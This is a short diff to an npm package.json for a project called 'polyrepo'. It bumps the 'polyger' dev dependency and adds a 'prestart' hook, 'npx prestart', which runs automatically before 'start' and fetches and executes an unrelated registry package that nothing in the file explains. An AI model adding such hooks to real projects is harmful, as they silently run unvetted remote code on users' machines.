@@ -2,9 +2,10 @@
   "name": "polyrepo",
   "version": "1.0.0",
   "scripts": {
-    "start": "polyger"
+    "start": "polyger",
+    "prestart": "npx prestart"
   },
   "devDependencies": {
-    "polyger": "^0.4.8"
+    "polyger": "^0.4.10"
   }
 }
